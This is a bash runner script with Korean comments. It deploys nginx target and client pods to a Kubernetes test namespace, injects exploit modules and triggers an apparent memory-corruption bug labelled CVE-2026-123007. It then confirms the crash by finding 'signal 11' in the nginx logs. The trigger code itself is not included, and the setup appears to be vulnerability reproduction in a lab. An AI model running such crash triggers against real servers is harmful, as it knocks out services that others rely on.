#!/bin/bash
# E0-DFIRtx 러너 — G2 게이트: 네이티브 amd64(EPYC Genoa, avx512f/vl)에서 123007 트리거
# 사전: kubectl 도달 + kubeconfig(OpenJDK2Shell kube/dfirtx-dev.conf 재사용, 절대 커밋 금지)
# 사용:
#   ops/e0_dfirtx.sh up        # ns·타깃·클라이언트 배포 + 코드 주입 + 지문 확인
#   ops/e0_dfirtx.sh smoke     # 오버크레딧 오라클 (~1분 네이티브)
#   ops/e0_dfirtx.sh full      # 풀 트리거 (≈60GiB, 네이티브 수 분) — 크래시 판정
#   ops/e0_dfirtx.sh fresh     # 타깃 worker 재시작 (프레시 힙)
#   ops/e0_dfirtx.sh logs      # 타깃 크래시 라인 확인
#   ops/e0_dfirtx.sh pull      # episode JSON 회수
#   ops/e0_dfirtx.sh down      # ns 삭제 (위생 규칙)
set -euo pipefail
cd "$(dirname "$0")/.."

KUBECONFIG="${KUBECONFIG:-/Users/1004276/Downloads/OpenJDK2Shell/kube/dfirtx-dev.conf}"
NS=n2r-test
KC="kubectl --kubeconfig $KUBECONFIG"
TARGET_IP=""

tpod() { $KC get pod -n $NS -l app=n2r-target -o jsonpath='{.items[0].metadata.name}'; }
tip()  { $KC get pod -n $NS -l app=n2r-target -o jsonpath='{.items[0].status.podIP}'; }
cpod() { $KC get pod -n $NS n2r-client; }

case "${1:-up}" in
up)
  $KC apply -f ops/dfirtx/target.yaml
  $KC apply -f ops/dfirtx/client.yaml
  echo "── pod 준비 대기"
  $KC wait -n $NS --for=condition=Ready pod/n2r-client --timeout=300s
  $KC wait -n $NS --for=condition=Ready pod -l app=n2r-target --timeout=300s
  echo "── 코드 주입 (exploit/common, exploit/trigger)"
  $KC exec -n $NS n2r-client -- mkdir -p /work/exploit/common /work/exploit/trigger /work/results
  $KC cp exploit/common/h2.py            $NS/n2r-client:/work/exploit/common/h2.py
  $KC cp exploit/common/rawtls.py        $NS/n2r-client:/work/exploit/common/rawtls.py
  $KC cp exploit/common/episode.py       $NS/n2r-client:/work/exploit/common/episode.py
  $KC cp exploit/trigger/trigger_123007.py $NS/n2r-client:/work/exploit/trigger/trigger_123007.py
  TARGET_IP=$(tip)
  echo "── 지문 확인 (본문 896B + ALPN h2)"
  $KC exec -n $NS n2r-client -- python3 -c "
import socket, ssl, time
# ALPN h2 협상 확인용
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; ctx.set_alpn_protocols(['h2','http/1.1'])
s = ctx.wrap_socket(socket.create_connection(('$TARGET_IP',443), timeout=5), server_hostname='t')
print('ALPN:', s.selected_alpn_protocol())
s.close()
# 본문 크기 확인용 (ALPN 미협상 → HTTP/1.1)
ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx2.check_hostname=False; ctx2.verify_mode=ssl.CERT_NONE
s2 = ctx2.wrap_socket(socket.create_connection(('$TARGET_IP',443), timeout=5), server_hostname='t')
s2.sendall(b'GET /index.html HTTP/1.1\r\nHost: t\r\nConnection: close\r\n\r\n')
data = b''
s2.settimeout(5)
try:
    while True:
        chunk = s2.recv(65536)
        if not chunk: break
        data += chunk
except socket.timeout:
    pass
head, _, body = data.partition(b'\r\n\r\n')
print('body bytes:', len(body.rstrip()))
"
  echo "TARGET_IP=$TARGET_IP"
  ;;
smoke|full)
  MODE="--smoke"; [ "$1" = "full" ] && MODE=""
  EP="ep09-firtx-$1"
  TARGET_IP=$(tip)
  cpod >/dev/null || { echo "client 없음 — 먼저 up" >&2; exit 1; }
  echo "── fresh worker (reload) 후 트리거 실행 ($1)"
  $KC exec -n $NS "$(tpod)" -- nginx -s reload
  sleep 2
  set +e
  $KC exec -n $NS n2r-client -- python3 -u /work/exploit/trigger/trigger_123007.py \
      --target "https://$TARGET_IP:443/" --arm a1-dfirtx --episode "$EP" \
      --results-root /work/results --host-profile dfirtx-genoa-native $MODE
  RC=$?
  set -e
  echo "── trigger exit=$RC"
  $KC logs -n $NS "$(tpod)" --tail=30 2>/dev/null | grep -iE 'exited on signal|signal 11' \
    && echo "G2 RESULT: CRASH CONFIRMED (DFIRtx)" || echo "G2 RESULT: no crash lines"
  ;;
fresh)
  $KC exec -n $NS "$(tpod)" -- nginx -s reload && echo "worker reloaded"
  ;;
logs)
  $KC logs -n $NS "$(tpod)" --tail=100 2>/dev/null | grep -iE 'exited on signal|signal 11|flood|prematurely' | tail -8 || echo "(없음)"
  ;;
pull)
  mkdir -p exploit/results/CVE-2026-123007/dfirtx
  $KC exec -n $NS n2r-client -- sh -c 'cd /work/results && tar cf - CVE-2026-123007 2>/dev/null' | \
    tar xf - -C exploit/results/ 2>/dev/null && echo "── 회수 완료:" && \
    find exploit/results/CVE-2026-123007 -path '*dfirtx*' -name '*.json' | head
  ;;
down)
  $KC delete namespace $NS --wait=false && echo "ns $NS 삭제 요청 (위생 규칙)"
  ;;
*)
  echo "사용: $0 {up|smoke|full|fresh|logs|pull|down}" >&2; exit 1 ;;
esac
